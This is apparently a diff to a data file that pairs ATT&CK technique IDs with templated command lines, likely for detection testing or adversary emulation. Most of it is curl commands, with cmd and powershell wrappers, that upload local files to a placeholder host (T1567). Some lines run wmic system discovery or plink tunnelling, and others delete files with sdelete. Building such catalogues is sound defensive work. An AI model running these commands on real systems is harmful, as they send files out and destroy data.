@@ -682,7 +682,7 @@ T1082 cmd /c "wmic.exe os get Caption"
 T1082 powershell -c "wmic.exe os get Caption"
 T1082 wmic os get Version
 T1082 cmd /c "wmic os get Version"
-T1082 powershell -c "wmic.exe os get Version"
+T1082 powershell -c "wmic os get Version"
 T1082 wmic.exe os get Version
 T1082 cmd /c "wmic.exe os get Version"
 T1082 powershell -c "wmic.exe os get Version"
@@ -1019,75 +1019,75 @@ T1572 powershell -c "plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:
 T1567 curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
 T1567 cmd /c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
 T1567 powershell -c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-T1567 curl.exe -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
+T1567 curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
 T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
 T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-T1567 curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 curl -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
+T1567 curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
 T1567 cmd /c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
 T1567 powershell -c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-T1567 curl.exe -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
+T1567 curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
 T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
 T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-T1567 curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 curl -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 curl.exe -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+T1567 curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
 T1567 curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
 T1567 cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
 T1567 powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
 T1567 curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
 T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
 T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-T1567 curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
 T1567 curl -X POST http://${ip_address}/upload -F files=@${source_file_path}
 T1567 cmd /c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
 T1567 powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
 T1567 curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
 T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
 T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-T1567 curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-T1567 cmd /c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-T1567 powershell -c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-T1567 curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-T1567 cmd /c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-T1567 powershell -c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-T1567 curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}
-T1567 cmd /c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-T1567 powershell -c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-T1567 curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}
-T1567 cmd /c "curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-T1567 powershell -c "curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-T1567 curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+T1567 curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 cmd /c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 powershell -c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
+T1567 cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
+T1567 powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
+T1567 curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
+T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
+T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
+T1567 curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
+T1567 cmd /c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
+T1567 powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
+T1567 curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
+T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
+T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
+T1567 curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 cmd /c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 powershell -c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 cmd /c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 powershell -c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 cmd /c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 powershell -c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 cmd /c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 powershell -c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
 T1485 sdelete ${local_file_path}
 T1485 cmd /c "sdelete ${local_file_path}"
 T1485 powershell -c "sdelete ${local_file_path}"
